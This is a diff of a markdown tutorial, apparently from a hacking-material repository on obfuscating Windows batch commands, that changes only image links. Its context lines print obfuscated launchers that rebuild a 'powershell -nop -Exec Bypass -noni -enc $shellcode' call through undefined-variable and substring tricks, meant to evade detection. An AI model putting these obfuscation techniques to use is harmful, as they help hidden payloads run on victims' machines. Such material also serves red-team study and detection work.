@@ -160,7 +160,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
       %comspec% /c p%A%owe%B%rshell.e%C%xe -n%C%op -E%A%xec B%C%yp%B%ass -n%A%oni -e%A%nc $shellcode
       exit
 
-![batch obfuscation](http://i65.tinypic.com/j0ec1z.jpg)<br />
+![batch obfuscation](http://i65.tinypic.com/16j287c.jpg)<br />
 `HINT: Undefined variables technic are only accessible in bat scripting (it will not work in terminal)`
 
 ---
@@ -185,7 +185,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
 
       %!h%e%i#%st%db0%%i#% -"s" | fi%!h%ds%i#%r O%pP0%e%!h%s
 
-![batch obfuscation](http://i.cubeupload.com/r6dWN8.jpg)
+![batch obfuscation](http://i64.tinypic.com/33lmik5.jpg)
 
 ---
 
@@ -204,7 +204,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
       %varObj:~2,1%%varObj:~11,1%%varObj:~3,1%.exe /c %varObj:~14,1%%varObj:~13,1%%varObj:~25,1%%varObj:~4,1%%varObj:~16,1%%varObj:~17,1%%varObj:~7,1%%varObj:~6,1%%varObj:~10,1%%varObj:~10,1%.exe -nop -%varObj:~25,1%%varObj:~8,1%%varObj:~3,1%%varObj:~3,1%%varObj:~4,1%%varObj:~12,1% -%varObj:~40,1%%varObj:~21,1%%varObj:~4,1%%varObj:~2,1% %varObj:~37,1%%varObj:~24,1%%varObj:~14,1%%varObj:~0,1%%varObj:~17,1%%varObj:~17,1% -noni -%varObj:~4,1%%varObj:~12,1%%varObj:~2,1% $shellcode
       exit
 
-![batch obfuscation](http://i.cubeupload.com/5gkOX8.jpg)
+![batch obfuscation](http://i67.tinypic.com/2zdu9z7.jpg)
 
 [!] [Description of %varObj% MasterKey (importante reading to understand the mechanism)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/pedro-Wandoelmo-key.md)<br />
 
